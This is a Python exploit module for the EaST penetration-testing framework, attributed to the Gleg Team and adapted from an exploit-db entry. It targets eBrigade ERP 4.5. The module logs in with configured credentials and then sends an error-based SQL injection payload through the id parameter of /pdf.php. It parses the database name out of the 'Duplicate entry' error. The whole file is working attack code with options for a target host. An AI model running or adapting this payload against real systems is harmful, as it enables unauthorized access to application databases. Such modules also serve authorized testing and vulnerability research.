from Sploit import Sploit
from collections import OrderedDict
import urllib
import urllib2
import cookielib

INFO = {}
INFO['NAME'] = "efa_ebrigade_erp_4_5_esql"
INFO['DESCRIPTION'] = "eBrigade ERP 4.5 error-based SQL injection"
INFO['VENDOR'] = "https://ebrigade.net/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The flaw lies within vulnerable parameter [id] in /pdf.php?pdf=DPS&id=[SQL].
Insufficient input sanitization results in error-based SQL injection and data compromisation.
"""
INFO['DOWNLOAD_LINK'] = "https://netcologne.dl.sourceforge.net/project/ebrigade/ebrigade/eBrigade%204.5/ebrigade_4.5.zip"
INFO['LINKS'] = ["https://www.exploit-db.com/exploits/46117"]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "/"
INFO['AUTHOR'] = """Original exploit: 10 Jan 2019, Ihsan Sencan
                    EaST Framework module: 17 Jan 2019, Gleg Team"""

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.57"
OPTIONS["PORT"] = 80
OPTIONS["BASEPATH"] = '/erp'
OPTIONS["SSL"] = False
OPTIONS["LOGIN"] = '1234'
OPTIONS["PASSWORD"] = '1234'

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 80
        self.basepath = '/'
        self.protocol = 'http'
        self.login = '1234'
        self.password = '1234'
        self.sqli = ' AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR))) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)'
        self.sqli = urllib.quote(self.sqli)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.basepath = self.args.get("BASEPATH", self.basepath)
        self.protocol = 'https' if self.args.get("SSL") else 'http'

        if not self.basepath == '/':
            self.basepath = '/' + self.basepath.strip('/')
        else:
            self.basepath = ''

        urllib2.install_opener(
            urllib2.build_opener(
                urllib2.HTTPCookieProcessor(cookielib.CookieJar()),
                urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
            )
        )

    def authorize(self):
        data = {
        'id': self.login,
        'pwd': self.password
        }
        url = '{}://{}:{}{}/check_login.php'.format(self.protocol, self.host, self.port, self.basepath)
        data = urllib.urlencode(data)
        urllib2.urlopen(url, data)

    def inject_sql(self):
        url = '{}://{}:{}{}/pdf.php?pdf=DPS&id=1{}'.format(self.protocol, self.host, self.port, self.basepath, self.sqli)
        r = urllib2.urlopen(url)
        return r.read()

    def parse_response(self, resp):
        start = resp.find('Duplicate entry') + 17
        end = resp.find('for key') - 2
        return resp[start:end]

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.log('[*] Authorizing...')
        self.authorize()
        self.log('[*] Injecting SQL...')
        resp = self.inject_sql()
        data = self.parse_response(resp)
        if data:
            self.log('[+] Success!\r\nDATABASE(): ' + data)
            self.finish(True)
        else:
            self.log('[-] Failed')
            self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()